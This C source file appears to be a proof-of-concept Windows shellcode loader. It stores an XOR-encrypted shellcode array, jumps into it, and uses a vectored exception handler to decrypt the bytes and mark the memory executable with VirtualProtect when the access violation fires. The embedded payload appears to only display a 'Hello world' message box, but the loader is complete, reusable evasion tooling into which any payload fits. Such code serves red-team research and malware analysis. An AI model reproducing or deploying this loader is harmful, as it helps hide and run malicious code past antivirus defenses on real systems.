#define CALL_FIRST 1
#define XOR_KEY 0x13

// shellcode from https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12
char enc_shellcode[] = "\x5b\x90\xff\x3b\x5b\x90\xf7\xe3\x5b\x9e\x06\x75\x13\x13\x13\x5b\x9e\x1e\x41\x13\x13\x13\xfb\x8d\x13\x13\x13\x5f\x98\xeb\x5b\x9e\x1e\x4e\x13\x13\x13\xec\xc3\x5b\x9e\x06\x4c\x13\x13\x13\x5b\x9e\x1e\x5e\x13\x13\x13\xfb\x6c\x13\x13\x13\x5e\x20\xda\x5f\x9e\x16\x72\x13\x13\x13\x5b\x9e\x06\x5d\x13\x13\x13\x5b\x20\xda\xec\xc3\x5b\x9e\x06\x45\x13\x13\x13\x5b\x9e\x1e\x19\x13\x13\x13\xfb\x45\x13\x13\x13\x5b\x20\xda\xec\xc3\x58\x56\x41\x5d\x56\x5f\x20\x21\x3d\x57\x5f\x5f\x13\x5f\x7c\x72\x77\x5f\x7a\x71\x61\x72\x61\x6a\x52\x13\x46\x40\x56\x41\x20\x21\x3d\x57\x5f\x5f\x13\x5e\x76\x60\x60\x72\x74\x76\x51\x7c\x6b\x52\x13\x5b\x76\x7f\x7f\x7c\x33\x64\x7c\x61\x7f\x77\x13\x5e\x76\x60\x60\x72\x74\x76\x13\x56\x6b\x7a\x67\x43\x61\x7c\x70\x76\x60\x60\x13\x5b\x90\xff\x3b\x76\x5f\x98\x17\x36\x73\x13\x13\x13\x5e\x98\x53\x0b\x5e\x9e\x73\x03\x5e\x98\x17\x37\xef\x5a\x98\x6b\x73\x5b\x98\xe2\xbf\x97\xd3\x67\x35\x99\x34\x93\xef\x72\x6f\x10\x93\xff\x33\x29\xf3\x66\x1b\x5b\xec\xd4\x5b\xec\xd4\xf8\xf6\x5e\x98\x13\x5e\x28\xd7\x66\xc5\x5b\x20\xd3\xfa\xb4\x13\x13\x13\x5a\x98\x4b\x23\x57\x98\x58\x2f\x5f\x10\xd8\x5a\x92\xd2\x9b\x13\x13\x13\x56\x98\x3a\x5e\x96\xfe\x66\x1b\x5b\x20\xd3\xfa\x96\x13\x13\x13\x5d\x9e\x17\x38\x56\x98\x62\x17\x5e\x10\xe6\x52\x98\x5b\x0b\x56\x98\x43\x33\x5f\x10\xc0\xec\xda\x5e\x9e\x1f\x99\x52\x98\x2a\x5b\x10\xe8\x5b\x98\xe1\xb5\x66\x1b\x99\x15\x97\xd3\x67\x1a\xf8\xe6\xf1\xf5\x5b\x20\xd3\xf8\x5d\x56\x98\x5b\x37\x5f\x10\xd8\x75\x52\x98\x1f\x5a\x56\x98\x5b\x0f\x5f\x10\xd8\x52\x98\x17\x9a\x5a\x28\xd6\x6f\x3c\x5a\x28\xd5\x60\x39\x5b\x9e\x27\x0b\x5b\x9e\x6f\x37\x23\x5f\x98\xf4\xb7\x93\x2d\x3d\x66\xe9\xb7\xd4\x14\x57\x5f\x5f\x13\x5a\x98\xdf\x52\xec\xc4\x5a\x98\xdf\x5b\x98\xc5\xfa\x07\xec\xec\xec\x5b\x10\xd0\x5b\x90\xd7\x3b\xd0";

LONG WINAPI myHandler(
    struct _EXCEPTION_POINTERS* ExceptionInfo
) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_ACCESS_VIOLATION) {
        printf("[*] Exception Caught: STATUS_ACCESS_VIOLATION\n");
        DWORD flOldProtect;
        for (int i = 0; i < sizeof(enc_shellcode); i++) {
            enc_shellcode[i] ^= XOR_KEY;
        }
        BOOL res = VirtualProtect(enc_shellcode, sizeof(enc_shellcode), PAGE_EXECUTE, &flOldProtect);
        if (res == TRUE) {
            printf("[*] Successfully changed permission to PAGE_EXECUTE\n");
        }
        else {
            printf("[*] Failed changing permission to PAGE_EXECUTE\n");
        }
    }
    return EXCEPTION_CONTINUE_EXECUTION;
}

int main()
{
    PVOID h1 = AddVectoredExceptionHandler(CALL_FIRST, myHandler);
    printf("[*] Attempting to execute encrypted shellcode\n");
    (*(void (*)()) & enc_shellcode)();
    RemoveVectoredExceptionHandler(h1);
    return 0;
}
